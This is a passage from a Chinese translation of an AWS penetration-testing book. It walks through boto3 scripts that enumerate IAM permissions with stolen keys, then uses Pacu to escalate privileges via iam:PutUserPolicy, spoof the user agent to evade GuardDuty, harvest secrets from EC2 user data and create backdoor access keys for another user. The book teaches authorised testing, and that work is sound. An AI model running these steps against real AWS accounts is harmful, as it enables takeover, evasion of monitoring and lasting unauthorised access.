while response['IsTruncated']:
    # Make the request for the next page of details
    response = client.get_account_authorization_details(Marker=response['Marker'])

    # Store the data again
    if response.get('UserDetailList'):
        user_details.extend(response['UserDetailList'])
    if response.get('GroupDetailList'):
        group_details.extend(response['GroupDetailList'])
    if response.get('RoleDetailList'):
        role_details.extend(response['RoleDetailList'])
    if response.get('Policies'):
        policy_details.extend(response['Policies'])
```

您可能已经注意到 AWS API 调用参数和响应的名称和结构存在不一致性（例如`ContinuationToken`与`NextToken`与`Marker`）。这是无法避免的，`boto3`库在其命名方案上存在不一致性，因此重要的是阅读您正在运行的命令的文档。

# 保存数据（再次）

现在，就像以前一样，我们希望将这些数据保存在某个地方。我们将使用以下代码将其存储在四个单独的文件`users.json`、`groups.json`、`roles.json`和`policies.json`中：

```
# Import the json library
import json

# Open up each file and dump the respective JSON into them
with open('./users.json', 'w+') as f:
    json.dump(user_details, f, indent=4, default=str)
with open('./groups.json', 'w+') as f:
    json.dump(group_details, f, indent=4, default=str)
with open('./roles.json', 'w+') as f:
    json.dump(role_details, f, indent=4, default=str)
with open('./policies.json', 'w+') as f:
    json.dump(policy_details, f, indent=4, default=str)
```

这将使最终脚本（不包括注释）看起来像下面这样：

```
#!/usr/bin/env python3

import boto3
import json

session = boto3.session.Session(profile_name='Test', region_name='us-west-2')
client = session.client('iam')

user_details = []
group_details = []
role_details = []
policy_details = []

response = client.get_account_authorization_details()

if response.get('UserDetailList'):
    user_details.extend(response['UserDetailList'])
if response.get('GroupDetailList'):
    group_details.extend(response['GroupDetailList'])
if response.get('RoleDetailList'):
    role_details.extend(response['RoleDetailList'])
if response.get('Policies'):
    policy_details.extend(response['Policies'])

while response['IsTruncated']:
    response = client.get_account_authorization_details(Marker=response['Marker'])
    if response.get('UserDetailList'):
        user_details.extend(response['UserDetailList'])
    if response.get('GroupDetailList'):
        group_details.extend(response['GroupDetailList'])
    if response.get('RoleDetailList'):
        role_details.extend(response['RoleDetailList'])
    if response.get('Policies'):
        policy_details.extend(response['Policies'])

with open('./users.json', 'w+') as f:
    json.dump(user_details, f, indent=4, default=str)
with open('./groups.json', 'w+') as f:
    json.dump(group_details, f, indent=4, default=str)
with open('./roles.json', 'w+') as f:
    json.dump(role_details, f, indent=4, default=str)
with open('./policies.json', 'w+') as f:
    json.dump(policy_details, f, indent=4, default=str)
```

现在我们可以使用以下命令运行脚本：

```
python3 get_account_details.py 
```

当前文件夹应该有四个新文件，其中包含帐户中用户、组、角色和策略的详细信息。

# 使用受损的 AWS 密钥进行权限枚举

我们现在可以扩展上一节的脚本，使用收集的数据来确定您当前用户具有的确切权限，通过相关不同文件中存储的数据。为此，我们首先需要在我们拉下来的用户列表中找到我们当前的用户。

# 确定我们的访问级别

在攻击场景中，您可能不知道当前用户的用户名，因此我们将添加使用`iam:GetUser` API 来确定该信息的代码行（请注意，如果您的凭据属于角色，则此调用将失败）：

```
   username = client.get_user()['User']['UserName'] 
```

然后，我们将遍历我们收集的用户数据，并寻找我们当前的用户：

```
# Define a variable that will hold our user
current_user = None

# Iterate through the enumerated users
for user in user_details:
    # See if this user is our user
    if user['UserName'] == username:
        # Set the current_user variable to our user
        current_user = user

        # We found the user, so we don't need to iterate through the rest of them
        break
```

现在我们可以检查一些可能附加到我们用户对象的不同信息。如果某个信息不存在，那么意味着我们不需要担心它的值。

为了得出我们用户的完整权限列表，我们需要检查以下数据：`UserPolicyList`、`GroupList`和`AttachedManagedPolicies`。`UserPolicyList`将包含附加到我们用户的所有内联策略，`AttachedManagedPolicies`将包括附加到我们用户的所有托管策略，`GroupList`将包含我们用户所属的组的列表。对于每个策略，我们需要提取与之关联的文档，对于组，我们需要检查附加到它的内联策略和托管策略，然后提取与之关联的文档，最终得出一个明确的权限列表。

# 分析附加到我们用户的策略

我们将首先收集附加到我们用户的内联策略文档。幸运的是，任何内联策略的整个文档都包含在我们的用户中。我们将向我们的脚本添加以下代码：

```
# Create an empty list that will hold all the policies related to our user
my_policies = []

# Check if any inline policies are attached to my user
if current_user.get('UserPolicyList'):
    # Iterate through the inline policies to pull their documents
    for policy in current_user['UserPolicyList']:
        # Add the policy to our list
        my_policies.append(policy['PolicyDocument'])
```

现在`my_policies`应该包括直接附加到我们用户的所有内联策略。接下来，我们将收集附加到我们用户的托管策略文档。策略文档并未直接附加到我们的用户，因此我们必须使用标识信息在我们的`policy_details`变量中找到策略文档：

```
# Check if any managed policies are attached to my user
if current_user.get('AttachedManagedPolicies'):
    # Iterate through the list of managed policies
    for managed_policy in user['AttachedManagedPolicies']:
        # Note the policy ARN so we can find it in our other variable
        policy_arn = managed_policy['PolicyArn']

        # Iterate through the policies stored in policy_details to find this policy
        for policy_detail in policy_details:
            # Check if we found the policy yet
            if policy_detail['Arn'] == policy_arn:
                # Determine the default policy version, so we know which version to grab
                default_version = policy_detail['DefaultVersionId']

                # Iterate the available policy versions to find the one we want
                for version in policy_detail['PolicyVersionList']:
                    # Check if we found the default version yet
                    if version['VersionId'] == default_version:
                        # Add this policy document to our original variable
                        my_policies.append(version['Document'])

                        # We found the document, so exit this loop
                        break
                # We found the policy, so exit this loop
                break
```

现在`my_policies`应该包括直接附加到我们用户的所有内联策略和托管策略。接下来，我们将找出我们所属的组，然后枚举附加到每个组的内联策略和托管策略。完成后，我们将得到分配给我们用户的完整权限列表：

```
# Check if we are in any groups
if current_user.get('GroupList'):
    # Iterate through the list of groups
    for user_group in current_user['GroupList']:
        # Iterate through all groups to find this one
        for group in group_details:
            # Check if we found this group yet
            if group['GroupName'] == user_group:
                # Check for any inline policies on this group
                if group.get('GroupPolicyList'):
                    # Iterate through each inline policy
                    for inline_policy in group['GroupPolicyList']:
                        # Add the policy document to our original variable
                        my_policies.append(inline_policy['PolicyDocument'])

                # Check for any managed policies on this group
                if group.get('AttachedManagedPolicies'):
                    # Iterate through each managed policy detail
                    for managed_policy in group['AttachedManagedPolicies']:
                        # Grab the policy ARN
                        policy_arn = managed_policy['PolicyArn']

                        # Find the policy in our list of policies
                        for policy in policy_details:
                            # Check and see if we found it yet
                            if policy['Arn'] == policy_arn:
                                # Get the default version
                                default_version = policy['DefaultVersionId']

                                # Find the document for the default version
                                for version in policy['PolicyVersionList']:
                                    # Check and see if we found it yet
                                    if version['VersionId'] == default_version:
                                        # Add the document to our original variable
                                        my_policies.append(version['Document'])

                                        # Found the version, so break out of this loop
                                        break
                                    # Found the policy, so break out of this loop
                                    break
```

现在脚本应该完成了，我们的`my_policies`变量应该包含直接附加到我们用户的所有内联和托管策略的策略文档，以及附加到我们用户所属的每个组的所有内联和托管策略。我们可以通过添加一个最终片段来检查这些结果，将数据输出到本地文件：

```
with open('./my-user-permissions.json', 'w+') as f:
 json.dump(my_policies, f, indent=4, default=str)
```

我们可以使用相同的命令运行文件：

```
 python3 get_account_details.py
```

然后，我们可以检查生成的`my-user-permissions.json`，其中应包含适用于您的用户的所有策略和权限的列表。它应该看起来像以下的屏幕截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/1a13046f-3011-49de-9475-47e670bddbcc.png)

现在我们有一个很好的权限列表，我们可以使用这些权限，以及我们可以在什么条件下应用这些权限。

# 另一种方法

需要注意的重要一点是，如果用户没有`iam:GetAccountAuthorization`权限，此脚本将失败，因为他们将无法收集用户、组、角色和策略列表。为了可能解决这个问题，我们可以参考本节开头的部分，其中指出有时通过 AWS API 有多种方法来做某事，这些不同的方法需要不同的权限集。

在我们的用户没有`iam:GetAccountAuthorizationDetails`权限的情况下，但他们拥有其他 IAM 读取权限，可能仍然有可能枚举我们的权限列表。我们不会运行并创建执行此操作的脚本，但如果您愿意尝试，这里是一个一般指南：

1.  检查我们是否有`iam:GetAccountAuthorizationDetails`权限

1.  如果是这样，请运行我们刚创建的脚本

1.  如果不是，请转到步骤 2

1.  使用`iam:GetUser` API 确定我们是什么用户（请注意，这对于角色不起作用！）

1.  使用`iam:ListUserPolicies` API 获取附加到我们的用户的内联策略列表

1.  使用`iam:GetUserPolicy` API 获取每个内联策略的文档

1.  使用`iam:ListAttachedUserPolicies` API 获取附加到我们的用户的托管策略列表

1.  使用`iam:GetPolicy` API 确定附加到我们的用户的每个托管策略的默认版本

1.  使用`iam:GetPolicyVersion` API 获取附加到我们的用户的每个托管策略的策略文档

1.  使用`iam:ListGroupsForUser` API 查找我们的用户属于哪些组

1.  使用`iam:ListGroupPolicies` API 列出附加到每个组的内联策略

1.  使用`iam:GetGroupPolicy` API 获取附加到每个组的每个内联策略的文档

1.  使用`iam:ListAttahedGroupPolicies` API 列出附加到每个组的托管策略

1.  使用`iam:GetPolicy` API 确定附加到每个组的每个托管策略的默认版本

1.  使用`iam:GetPolicyVersion` API 获取附加到每个组的每个托管策略的策略文档

正如您可能已经注意到的，这种权限枚举方法需要对 AWS 进行更多的 API 调用，而且可能会对倾听的防御者产生更大的影响，比我们的第一种方法。但是，如果您没有`iam:GetAccountAuthorizationDetails`权限，但您有权限遵循列出的所有步骤，那么这可能是正确的选择。

# 使用 Pacu 进行特权升级和收集凭据

在尝试检测和利用我们目标用户的特权升级之前，我们将添加另一个策略，使用户容易受到特权升级的影响。在继续之前，向我们的原始`Test`用户添加一个名为`PutUserPolicy`的内联策略，并使用以下文档：

```
{ 
    "Version": "2012-10-17", 
    "Statement": [ 
        { 
            "Effect": "Allow", 
            "Action": "iam:PutUserPolicy", 
            "Resource": "*" 
        } 
    ] 
} 
```

此策略允许我们的用户在任何用户上运行`iam:PutUserPolicy` API 操作。

# Pacu - 一个开源的 AWS 利用工具包

**Pacu**是由 Rhino Security Labs 编写的开源 AWS 利用工具包。它旨在帮助渗透测试人员攻击 AWS 环境；因此，现在我们将快速安装和设置 Pacu，以自动化我们一直在尝试的这些攻击。

有关安装和配置的更详细说明可以在第十九章中找到，*将所有内容整合在一起-真实世界的 AWS 渗透测试*；这些步骤旨在让您尽快设置并使用 Pacu。

Pacu 可以通过 GitHub 获得，因此我们需要运行一些命令来安装所有内容（我们正在运行 Kali Linux）。首先，让我们确认是否已安装`git`：

```
 apt-get install git 
```

然后，我们将从 GitHub 克隆 Pacu 存储库（[`github.com/RhinoSecurityLabs/pacu`](https://github.com/RhinoSecurityLabs/pacu)）:

```
 git clone https://github.com/RhinoSecurityLabs/pacu.git
```

然后，我们将切换到 Pacu 目录并运行安装脚本，这将确保我们安装了正确的 Python 版本（Python 3.5 或更高版本），并使用`pip3`安装必要的依赖项：

```
 cd pacu && bash install.sh 
```

现在 Pacu 应该已经成功安装，我们可以使用以下命令启动它：

```
 python3 pacu.py
```

将会出现一些消息，让您知道已生成新的设置文件并创建了新的数据库。它将检测到我们尚未设置`session`，因此会要求我们命名一个新的会话以创建。Pacu 会话基本上是一个项目，您可以在同一安装中拥有多个独立的 Pacu 会话。会话数据存储在本地 SQLite 数据库中，每个单独的会话可以被视为一个项目或目标公司。当您在多个环境上工作时，它允许您保持数据和凭证的分离。每个 Pacu 会话之间的日志和配置也是分开的；我们将命名我们的会话为`Demo`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/58a56fd7-354a-48e5-aa14-01e84088d581.png)

一旦我们成功创建了新会话，将会呈现一些有关 Pacu 的有用信息，我们稍后将更深入地了解这些信息。

# Kali Linux 检测绕过

因为我们正在 Kali Linux 上运行 Pacu，所以在帮助输出之后，我们会看到有关我们用户代理的额外消息，类似于以下截图中显示的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/1bfd49e7-c99d-4886-89c8-3d794ea0a6c5.png)

我们可以看到 Pacu 已经检测到我们正在运行 Kali Linux，并相应地修改了我们的用户代理。 `GuardDuty`是 AWS 提供的众多安全服务之一，用于检测和警报 AWS 环境中发生的可疑行为。 `GuardDuty`检查的一项内容是您是否正在从 Kali Linux 发起 AWS API 调用（[`docs.aws.amazon.com/guardduty/latest/ug/guardduty_pentest.html#pentest1`](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_pentest.html#pentest1)）。我们希望在攻击某个账户时尽量触发尽可能少的警报，因此 Pacu 已经内置了自动绕过这项安全措施。 `GuardDuty`检查发起 API 调用的用户代理，以查看是否能从中识别 Kali Linux，并在识别到时发出警报。Pacu 将我们的用户代理修改为一个通用用户代理，不会引起`GuardDuty`的怀疑。

# Pacu CLI

紧接着这个输出，我们可以看到一个名为 Pacu CLI 的东西：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/5db694f7-e5df-446b-a60f-cf8b6eed15db.png)

这显示了我们正在 Pacu CLI 中，我们的活动会话名为 Demo，我们没有活动密钥。我们可以通过几种不同的方式向 Pacu 数据库添加一些 AWS 密钥，例如使用`set_keys`命令，或者从 AWS CLI 导入它们。

我们已经设置了 AWS 密钥以便与 AWS CLI 一起使用，因此最简单的方法是从 AWS CLI 导入它们。我们可以通过运行以下 Pacu 命令导入我们的`Test` AWS CLI 配置文件：

```
 import_keys Test 
```

此命令应返回以下输出：

```
Imported keys as "imported-Test"
```

现在，如果我们运行`whoami`命令，我们应该能够看到我们的访问密钥 ID 和秘密访问密钥已被导入，如果我们查看 Pacu CLI，我们现在可以看到，而不是`No Keys Set`，它显示了我们导入的密钥的名称。Pacu CLI 的位置指示了当前凭证集的位置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/6a20c952-5fa3-427d-9756-85a44e405fef.png)

现在我们已经设置好了 Pacu，我们可以通过从 Pacu CLI 运行`ls`命令来检索当前模块的列表。为了自动化本章前面我们已经完成的一个过程，我们将使用`iam__enum_permissions`模块。该模块将执行必要的 API 调用和数据解析，以收集我们的活动凭证集的确认权限列表。该模块也可以针对账户中的其他用户或角色运行，因此为了更好地了解其功能，运行以下命令：

```
 help iam__enum_permissions 
```

现在你应该能够看到该模块的描述以及它支持的参数。为了针对我们自己的用户运行该模块，我们不需要传入任何参数，所以我们可以直接运行以下命令来执行该模块：

```
 run iam__enum_permissions 
```

如果当前的凭证集有权限枚举他们的权限（这是应该的，因为我们在本章前面设置了），输出应该表明模块成功地收集了该用户或角色的权限：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/66bcf05a-27fc-4c4e-9df3-a19880b75ab2.png)

现在我们已经枚举了我们用户的权限，我们可以通过再次运行`whoami`命令来查看枚举的数据。这次，大部分数据将被填充。

Groups 字段将包含我们的用户所属的任何组的信息，Policies 字段将包含任何附加到我们的用户的 IAM 策略的信息。识别信息，如`UserName`，`Arn`，`AccountId`和`UserId`字段也应该填写。

在输出的底部，我们可以看到`PermissionsConfirmed`字段，其中包含 true 或 false，并指示我们是否能够成功枚举我们拥有的权限。如果我们被拒绝访问某些 API 并且无法收集完整的权限列表，该值将为 false。

`Permissions`字段将包含我们的用户被赋予的每个 IAM 权限，这些权限可以应用到的资源以及使用它们所需的条件。就像我们在本章前面编写的脚本一样，这个列表包含了附加到我们的用户的任何内联或托管策略授予的权限，以及附加到我们的用户所属的任何组的任何内联或托管策略授予的权限。

# 从枚举到特权升级

我们的权限已经被枚举，所以现在我们将尝试使用这些权限进行环境中的特权升级。还有一个 Pacu 模块叫做`iam_privesc_scan`。该模块将运行并检查你枚举的权限集，以查看你的用户是否容易受到 AWS 中 21 种不同已知的特权升级方法中的任何一种的影响。

Rhino Security Labs 撰写了一篇文章，详细介绍了这 21 种不同的特权升级方法以及如何手动利用它们，你可以在这里参考：[`rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/`](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)。

在模块检查我们是否容易受到这些方法中的任何一种的影响之后，它将尝试利用它们来为我们进行特权升级，这让我们的工作变得容易。如果你对特权升级模块想了解更多，你可以使用`help`命令来查看：

```
help iam__privesc_scan
```

正如你所看到的，这个模块也可以针对账户中的其他用户和角色运行，以确定它们是否也容易受到特权升级的影响，但目前我们只会针对我们自己的用户。

我们已经枚举了我们的权限，所以我们可以继续运行特权升级模块而不带任何参数：

```
run iam__privesc_scan
```

该模块将执行，搜索您的权限，看看您是否容易受到它检查的任何升级方法的攻击，然后它将尝试利用它们。对于我们的`Test`用户，它应该会检测到我们容易受到`PutUserPolicy`特权升级方法的攻击。然后它将尝试滥用该权限，以在我们的用户上放置（实质上附加）一个新的内联策略。我们控制着我们附加到用户的策略，因此我们可以指定一个管理员级别的 IAM 策略并将其附加到我们的用户，然后我们将获得管理员访问权限。该模块将通过向我们的用户添加以下策略文档来自动执行此操作：

```
{ 
    "Version": "2012-10-17", 
    "Statement": [ 
        { 
            "Effect": "Allow", 
            "Action": "*", 
            "Resource": "*" 
        } 
    ] 
} 
```

以下截图显示的输出应该与您运行特权升级模块时看到的类似：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/9f7c65a0-0008-42aa-bb2a-0d36becbb74d.png)

在前面的截图中，我们可以看到一行`成功添加了名为 jea70c72mk 的内联策略！您不应该具有管理员权限。`这听起来不错，但让我们确认一下以确保。

我们可以通过几种不同的方式来确认这一点；其中一种是再次运行`iam__enum_permissions`模块，然后查看权限字段。它应该包括一个新的权限，即星号（`*`），这是一个通配符，表示`所有权限`。这意味着我们对环境拥有管理员访问权限！

如果我们在 AWS Web 控制台中查看我们的用户，我们会看到我们的用户附加了一个名为`jea70c72mk`的新策略，当我们点击它旁边的箭头以展开文档时，我们可以看到其中放置了管理员策略：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/a70a6049-18db-4ef1-ad7a-1028fe8966d2.png)

# 使用我们的新管理员特权

Pacu 允许我们直接从 Pacu CLI 使用 AWS CLI，用于您可能只想运行单个命令而不是完整模块的情况。让我们利用这个功能和我们的新管理员权限来运行一个 AWS CLI 命令，以请求我们以前没有的数据。这可以通过像平常一样运行 AWS CLI 命令来完成，这样我们就可以尝试运行一个命令来枚举账户中的其他资源。我们目前在我们自己的个人账户中，所以这个命令可能对您来说不会返回任何有效数据，但是在攻击其他账户时检查这个 API 调用将是很重要的。

我们可以通过从 Pacu CLI 运行以下命令来检查账户是否在`us-east-1`地区启用了`GuardDuty`：

```
   aws guardduty list-detectors --profile Test --region us-west-2 
```

在我们的`Test`账户中，我们确实运行了`GuardDuty`，所以我们得到了下面截图中显示的输出。但是，如果您没有运行`GuardDuty`，那么`DetectorIds`字段将为空：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/a679d048-b454-47a5-b46a-d7f24af21fc0.png)

该命令从 AWS 返回了一个`DetectorId`。对于这个 API 调用，任何数据的存在都意味着`GuardDuty`先前已经在该地区启用，因此可以安全地假定它仍然在没有进行更多 API 调用的情况下启用。如果在目标地区禁用了`GuardDuty`，`DetectorIds`将只是一个空列表。作为攻击者，最好是`GuardDuty`被禁用，因为这样我们就知道它不会警报我们正在执行的任何恶意活动。

然而，即使启用了`GuardDuty`，这并不意味着我们的努力是徒劳的。在这样的攻击场景中，有许多因素会起作用，比如是否有人在关注被触发的`GuardDuty`警报，如果他们注意到了警报，对警报做出反应的响应时间，以及做出反应的人是否对 AWS 有深入的了解，能够完全追踪你的行动。

我们可以通过运行`detection__enum_services` Pacu 模块来检查`GuardDuty`和其他日志记录和监控服务。该模块将检查 CloudTrail 配置、CloudWatch 警报、活动的 Shield 分布式拒绝服务（DDoS）保护计划、`GuardDuty`配置、Config 配置和资源，以及虚拟私有云（VPC）流日志。这些服务都有不同的目的，但作为攻击者，了解谁在监视您和跟踪您非常重要。

Pacu 在枚举类别中有许多模块，可用于枚举目标 AWS 帐户中的各种资源。一些有趣的模块包括`aws__enum_account`模块，用于枚举当前 AWS 帐户的信息；`aws__enum_spend`模块，用于收集正在花费资金的 AWS 服务列表（因此您可以确定使用哪些服务，而无需直接查询该服务的 API）；或`ec2__download_userdata`模块，用于下载和解码附加到帐户中每个 EC2 实例的 EC2 用户数据。

EC2 用户数据本质上只是一些文本，您可以将其添加到 EC2 实例中，一旦实例上线，该数据就会对其可用。这可以用于设置实例的初始配置，或者为其提供可能需要稍后查询的设置或值。还可以通过 EC2 用户数据执行代码。

通常，用户或软件会将硬编码的机密信息（例如 API 密钥、密码和环境变量）放入 EC2 用户数据中。这是不良做法，并且亚马逊在其文档中不鼓励这样做，但这仍然是一个问题。作为攻击者，这对我们有利。任何用户都可以通过`ec2:DescribeInstanceAttribute`权限读取 EC2 用户数据，因此任何硬编码的机密信息也会对他们可用。作为攻击者，检查这些数据是否有用非常重要。

`ec2__download_userdata` Pacu 模块将自动遍历并下载帐户中枚举的所有实例和启动模板的用户数据，使我们能够轻松地筛选结果。

您可以运行以下命令来启动该模块：

```
 run ec2__download_userdata 
```

现在 Pacu 将检查其已知的每个 EC2 实例是否有用户数据，如果有，它将下载到主 Pacu 目录中的`./sessions/[session name]/downloads/ec2_user_data/`文件夹中。

如果您尚未使用`ec2__enum`模块在目标帐户中枚举 EC2 实例和启动模板，则在执行模块之前将提示您运行它。您可能会收到一条消息，确认是否要针对每个 AWS 区域运行该模块，这样做现在是可以的，因此我们将回答`y`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d93c92a6-e74e-4a18-8066-ef9ce9be44a7.png)

在枚举了 EC2 实例之后，它可能会询问您是否对 EC2 启动模板进行相同的操作，因为启动模板也包含用户数据。我们也可以允许它进行枚举。

在枚举了实例和启动模板之后，执行将切换回我们原始的`ec2__download_userdata`模块，以下载和解码我们找到的任何实例或启动模板相关联的用户数据。

该模块在我们的帐户中找到了三个 EC2 实例和一个 EC2 启动模板，这些实例和模板都与用户数据相关联。以下截图显示了模块的输出，包括其执行结果以及存储数据的位置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/ed322637-f4f9-4021-9eb3-819e9fe9e0d6.png)

`ec2__download_userdata`模块在帐户中找到了附加到四个 EC2 实例中的用户数据，并在帐户中找到了一个启动模板中的一个。然后将这些数据保存到 Pacu 目录的`./sessions/Demo/downloads/ec2_user_data/`文件夹中。

如果我们导航到这些文件下载到的文件夹并在文本编辑器中打开它们，我们可以看到明文数据。以下截图显示了`ap-northeast-2`地区中具有`i-0d4ac408c4454dd9b`ID 实例的用户数据如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/dc42e7e7-0963-4aa3-bc64-ddcedaa894eb.png)

这只是一个示例，用来演示这个概念，所以基本上当 EC2 实例启动时，它将运行这个命令：

```
 echo "test" > /test.txt 
```

然后它将继续引导过程。大多数情况下，传递到 EC2 用户数据中的脚本只有在实例首次创建时才会执行，但是通过在前面的用户数据中使用`#cloud-boothook`指令，实例被指示在每次引导时运行此代码。这是一种很好的方法，可以通过在用户数据中放置一个反向 shell 来获得对 EC2 实例的持久访问权限，以便在每次实例重新启动时执行，但这将在后续章节中进一步讨论。

# 总结

在本章中，我们已经介绍了如何利用 Python 的`boto3`库来进行 AWS 渗透测试。它使我们能够快速简单地自动化我们攻击过程的部分，我们特别介绍了如何为自己和环境中的其他人枚举 IAM 权限的方法（以两种不同的方式），以及如何应用这些知识来提升我们的特权，希望成为账户的完整管理员。

我们还看到了 Pacu 已经为我们自动化了很多这个过程。尽管 Pacu 很好，但它不能涵盖你所想到的每一个想法、攻击方法或漏洞，因此学会如何在 Pacu 之外正确地与 AWS API 进行交互是很重要的。然后，凭借这些知识，你甚至可以开始为其他人编写自己的 Pacu 模块。

在下一章中，我们将继续使用`boto3`和 Pacu 来为我们的目标环境建立持久访问。这使我们能够在最坏的情况下幸存，并确保我们可以保持对环境的访问权限。这使我们能够帮助培训防御者进行事件响应，以便他们可以了解他们的环境中哪些区域是盲点，以及他们如何修复它们。在 AWS 中建立持久性的潜在方法有很多种，其中一些已经被 Pacu 自动化，我们将研究如何使用 IAM 和 Lambda 来部署这些方法。


# 第十一章：使用 Boto3 和 Pacu 维持 AWS 持久性

在 AWS 环境中建立持久性允许您保持特权访问，即使在您的主动攻击被检测到并且您对环境的主要访问方式被关闭的情况下。并不总是可能完全保持低调，所以在我们被抓到的情况下，我们需要一个备用计划（或两个，或三个，或……）。理想情况下，这个备用计划是隐蔽的，以便在需要再次访问环境时建立和执行。

有许多与恶意软件、逃避和持久性相关的技术和方法论可以应用到本章，但我们将专注于在 AWS 中可以滥用的不同方法，而不一定是整个红队风格的渗透测试的方法论。在 AWS 中的持久性技术与传统的持久性类型有很大不同，比如在 Windows 服务器上，但这些技术（正如我们已经知道的）也可以应用于我们攻击的 AWS 环境中的任何服务器。

在本章中，我们将专注于实际 AWS 环境中的持久性，而不是环境中的服务器。这些类型的持久性包括后门用户凭据、后门角色信任关系、后门 EC2 安全组、后门 Lambda 函数等等。

在本章中，我们将涵盖以下主题：

+   后门用户凭据

+   后门角色信任关系

+   后门 EC2 安全组

+   使用 Lambda 函数作为持久性看门狗

# 后门用户

在我们开始之前，让我们定义一下后门到底是什么。在本章的背景下，它的意思几乎与字面上的意思相同，即我们正在打开一个后门进入环境，以便在前门关闭时，我们仍然可以进入。在 AWS 中，后门可以是本章中涵盖的任何一种东西，前门将是我们对环境的主要访问方式（即被攻破的 IAM 用户凭据）。我们希望我们的后门能够在我们的妥协被防御者检测到并关闭被攻破的用户的情况下持续存在，因为在这种情况下，我们仍然可以通过后门进入。

正如我们在之前的章节中反复演示和使用的那样，IAM 用户可以设置访问密钥 ID 和秘密访问密钥，允许他们访问 AWS API。最佳实践通常是使用替代的身份验证方法，比如单点登录（SSO），它授予对环境的临时联合访问，但并非总是遵循最佳实践。我们将继续使用与之前章节中相似的场景，我们在那里拥有一个 IAM 用户`Test`的凭据。我们还将继续使用我们的用户通过特权升级获得对环境的管理员级别访问的想法，这是我们在第十章中利用的特权升级 AWS 账户使用被盗的密钥、Boto3 和 Pacu。

# 多个 IAM 用户访问密钥

账户中的每个 IAM 用户有两对访问密钥的限制。我们的测试用户已经创建了一个，所以在我们达到限制之前还可以创建一个。考虑到我们一直在使用的密钥是别人的，我们碰巧获得了对它们的访问，我们可以使用的一种简单的持久性形式就是为我们的用户创建第二组密钥。这样做，我们将拥有同一个用户的两组密钥：一组是我们被攻破的，另一组是我们自己创建的。

然而，这有点太简单了，因为如果我们被检测到，防御方的人员只需移除我们的用户，就可以一举删除我们对环境的两种访问方法。相反，我们可以选择针对环境中的不同特权用户创建我们的后门密钥。

首先，我们想要查看账户中存在哪些用户，所以我们将运行以下 AWS CLI 命令：

```
aws iam list-users --profile Test
```

该命令将返回账户中每个 IAM 用户的一些标识信息。这些用户中的每一个都是我们后门密钥的潜在目标，但我们需要考虑已经有两组访问密钥的用户。如果一个用户已经有两组密钥，而有人尝试创建第三组，API 将抛出一个错误，这可能会对倾听的捍卫者产生很大的噪音，最终使我们被抓住。

我想针对用户`Mike`进行操作，他是我们 AWS CLI 命令返回的用户之一。在尝试给`Mike`添加访问密钥之前，我将通过以下命令检查他是否已经有两组访问密钥：

```
aws iam list-access-keys --user-name Mike --profile Test 
```

以下截图显示了该命令的输出，以及`Mike`已经有两组访问密钥：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/3632ae0c-963e-44bc-bfda-da9d5f7d52af.png)

图 1：列出 Mike 的访问密钥显示他已经有两组

这意味着我们不应该针对`Mike`进行操作。这是因为尝试创建另一组密钥将失败，导致 AWS API 出现错误。一个自以为是的捍卫者可能能够将该错误与您的恶意活动相关联，最终使您被抓住。

之前出现过另一个用户名为`Sarah`的用户，所以让我们来检查她设置了多少个访问密钥：

```
aws iam list-access-keys --user-name Sarah --profile Test
```

这一次，结果显示为空数组，这表明`Sarah`没有设置访问密钥：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/cf323cea-9d65-4a23-a590-6c264ce137ff.png)

图 2：当我们尝试列出 Sarah 的时候，没有访问密钥显示出来

现在我们知道我们可以针对`Sarah`进行持久化，所以让我们运行以下命令来创建一对新的密钥：

```
aws iam create-access-key --user-name Sarah --profile Test
```

响应应该类似于以下截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f9abfe8b-34b8-499b-b8ba-b2525f62a482.png)

图 3：属于 Sarah 的访问密钥 ID 和秘密访问密钥

现在我们可以使用返回的密钥来访问与`Sarah`相关的任何权限。请记住，这种方法可以用于特权升级，以及在您的初始访问用户权限较低的情况下进行持久化，但`iam:CreateAccessKey`是其中之一。

让我们将`Sarah`的凭据存储在本地，以便我们在此期间不需要担心它们。为此，我们可以运行以下命令：

```
aws configure --profile Sarah
```

然后我们可以填写我们被提示的值。同样，我们可以使用`set_keys`命令将这些密钥添加到 Pacu 中。

# 使用 Pacu 进行操作

Pacu 还有一个模块可以为我们自动完成整个过程。这个模块称为`iam__backdoor_users_keys`模块，自动完成了我们刚刚进行的过程。要尝试它，请在 Pacu 中运行以下命令：

```
run iam__backdoor_users_keys 
```

默认情况下，我们将得到一个用户列表供选择，但也可以在原始命令中提供用户名。

现在当我们的原始访问环境被发现时，我们有了一个（希望是高特权的）用户的备份凭据。如果我们愿意，我们可以使用之前章节的技术来枚举该用户的权限。

# 后门角色信任关系

IAM 角色是 AWS 的一个重要组成部分。简单来说，角色可以被认为是为某人/某物在一段时间内（默认为 1 小时）提供特定权限的。这个某人或某物可以是一个人，一个应用程序，一个 AWS 服务，另一个 AWS 账户，或者任何以编程方式访问 AWS 的东西。

# IAM 角色信任策略

